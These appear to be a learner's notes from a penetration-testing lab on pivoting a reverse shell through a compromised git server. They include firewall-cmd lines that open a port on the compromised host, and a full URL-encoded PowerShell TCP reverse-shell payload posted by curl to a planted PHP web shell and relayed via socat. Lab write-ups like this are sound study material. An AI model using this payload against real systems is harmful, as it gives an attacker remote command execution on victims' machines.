refer notepad for now

So we have 2 methods to execute and talk back with the server
1st Burpsuite
2nd Curl

I was not getting the shell means firewall is not allowing us to pass the outbound traffic. So let's open the port which should be greater than 15000.

```
firewall-cmd --zone=public --add-port 15999/tcp
```

```
firewall-cmd --list-all
```

I am doing something wrong will review things.

So i have checked and we are getting the reverse shell at the production server
![[Pasted image 20240731122756.png]]

So let's see if we have configured the socat correctly or not.

So i am able to ping the compromised server from the kali aka attacker machine.

But not able to ping our ping machine through git-server

I got the mistake i was doing

See gitserv can talk back to production serv
10.200.87.150 -> 10.200.87.200

10.200.87.200 -> attacker machine

SO we have two ways either get the reverse shell in the production server itself.
In both the technique we have to add the port to allow in the firewall.

```
curl -X POST http://10.200.87.150/web/exploit-sardarji.php -d "a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.87.200%27%2C15999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

So what i was doing is i though we have to put the attacker IP in the reverse shell and it will just send the reverse shell to us. But this is not how things works.

Will send the reverse shell to the .200 and than it will send it to us aka attacker using Socat.
